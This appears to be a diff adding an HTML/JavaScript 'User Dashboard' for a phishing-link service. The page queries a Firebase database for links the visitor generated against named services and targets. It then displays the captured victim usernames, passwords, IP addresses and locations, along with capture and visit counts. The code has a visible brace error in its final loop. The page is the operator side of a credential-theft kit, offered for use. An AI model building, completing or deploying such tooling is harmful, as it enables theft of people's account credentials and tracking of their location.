@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>User Dashboard</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="firebase-config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #0a0a0a;
+            color: #fff;
+            padding: 20px;
+        }
+        .container { max-width: 1000px; margin: 0 auto; }
+        .header {
+            background: linear-gradient(135deg, #ff6600, #ff3300);
+            padding: 30px;
+            border-radius: 15px;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 { font-size: 2em; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
+        .header p { margin-top: 10px; opacity: 0.9; }
+        
+        .dashboard-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        .card {
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 12px;
+            padding: 20px;
+        }
+        .card h3 { color: #ff6600; margin-bottom: 15px; }
+        .card .data-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid #222;
+        }
+        .card .data-row:last-child { border-bottom: none; }
+        .card .label { color: #888; }
+        .card .value { color: #0f0; font-weight: bold; }
+        
+        .link-section {
+            background: #111;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid #222;
+        }
+        .link-section h3 { color: #ff6600; margin-bottom: 15px; }
+        .link-item {
+            background: #1a1a1a;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 10px;
+            border: 1px solid #333;
+        }
+        .link-item .service { color: #ff6600; font-weight: bold; }
+        .link-item .target { color: #888; }
+        .link-item .status { color: #0f0; }
+        .link-item .data-captured {
+            background: rgba(0,255,0,0.1);
+            padding: 10px;
+            border-radius: 5px;
+            margin-top: 10px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📊 User Dashboard</h1>
+            <p>🌐 Your IP: <span id="userIP">Detecting...</span></p>
+        </div>
+        
+        <div class="dashboard-grid">
+            <div class="card">
+                <h3>📊 Your Stats</h3>
+                <div class="data-row">
+                    <span class="label">Links Generated</span>
+                    <span class="value" id="myLinks">0</span>
+                </div>
+                <div class="data-row">
+                    <span class="label">Data Captured</span>
+                    <span class="value" id="myCaptures">0</span>
+                </div>
+                <div class="data-row">
+                    <span class="label">Total Visits</span>
+                    <span class="value" id="myVisits">0</span>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h3>🌍 IP Info</h3>
+                <div class="data-row">
+                    <span class="label">Your IP</span>
+                    <span class="value" id="displayIP">-</span>
+                </div>
+                <div class="data-row">
+                    <span class="label">ISP</span>
+                    <span class="value" id="displayISP">-</span>
+                </div>
+                <div class="data-row">
+                    <span class="label">Location</span>
+                    <span class="value" id="displayLocation">-</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="link-section">
+            <h3>🔗 Your Generated Links</h3>
+            <div id="linksContainer">
+                <div style="text-align:center;color:#666;">Loading your links...</div>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        let visitorID = localStorage.getItem('visitorID');
+        if (!visitorID) {
+            visitorID = 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            localStorage.setItem('visitorID', visitorID);
+        }
+        
+        let userIP = 'Unknown';
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                userIP = data.ip;
+                document.getElementById('userIP').textContent = userIP;
+                document.getElementById('displayIP').textContent = userIP;
+            });
+        
+        fetch('https://ipapi.co/json/')
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('displayISP').textContent = data.org || 'Unknown';
+                document.getElementById('displayLocation').textContent = (data.city || '') + ', ' + (data.country_name || '');
+            })
+            .catch(() => {});
+        
+        db.ref('generated_links').orderByChild('generatedBy').equalTo(visitorID).once('value', snapshot => {
+            const data = snapshot.val();
+            const container = document.getElementById('linksContainer');
+            
+            if (!data) {
+                container.innerHTML = '<div style="text-align:center;color:#666;">No links generated yet. Go to main page to generate links!</div>';
+                document.getElementById('myLinks').textContent = '0';
+                return;
+            }
+            
+            let html = '';
+            let count = 0;
+            const entries = Object.entries(data).reverse();
+            
+            entries.forEach(([linkId, item]) => {
+                count++;
+                const time = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'Unknown';
+                html += `
+                    <div class="link-item">
+                        <div><span class="service">${item.service || 'Unknown'}</span> | Target: <span class="target">${item.target || 'N/A'}</span></div>
+                        <div style="font-size:0.85em;color:#666;margin:5px 0;">Link: ${item.link || 'N/A'}</div>
+                        <div style="font-size:0.85em;">Status: <span class="status">${item.status || 'active'}</span> | ${time}</div>
+                        <div class="data-captured" id="captured_${linkId}">
+                            <strong style="color:#0f0;">🔓 Data Captured!</strong><br>
+                            <span id="captureData_${linkId}">Loading...</span>
+                        </div>
+                    </div>
+                `;
+                
+                db.ref('captured_data/' + linkId).once('value', snap => {
+                    const capData = snap.val();
+                    const div = document.getElementById('captured_' + linkId);
+                    const dataSpan = document.getElementById('captureData_' + linkId);
+                    if (capData && div) {
+                        div.style.display = 'block';
+                        dataSpan.innerHTML = `
+                            👤 Username: ${capData.username || 'N/A'}<br>
+                            🔑 Password: ${capData.password || 'N/A'}<br>
+                            🌐 IP: ${capData.ip || 'N/A'}<br>
+                            📍 Location: ${capData.location || 'Unknown'}
+                        `;
+                    }
+                });
+            });
+            
+            container.innerHTML = html;
+            document.getElementById('myLinks').textContent = count;
+        });
+        
+        db.ref('generated_links').once('value', snapshot => {
+            const data = snapshot.val();
+            if (!data) return;
+            
+            let captureCount = 0;
+            let visitCount = 0;
+            
+            Object.entries(data).forEach(([linkId, item]) => {
+                if (item.generatedBy === visitorID) 
+                    db.ref('captured_data/' + linkId).once('value', snap => {
+                        if (snap.val()) captureCount++;
+                        document.getElementById('myCaptures').textContent = captureCount;
+                    });
+                    
+                    db.ref('visits/' + linkId).once('value', snap => {
+                        const visits = snap.val();
+                        if (visits) {
+                            visitCount += Object.keys(visits).length;
+                        }
+                        document.getElementById('myVisits').textContent = visitCount;
+                    });
+                }
+            });
+        });
+    </script>
+</body>
+</html>
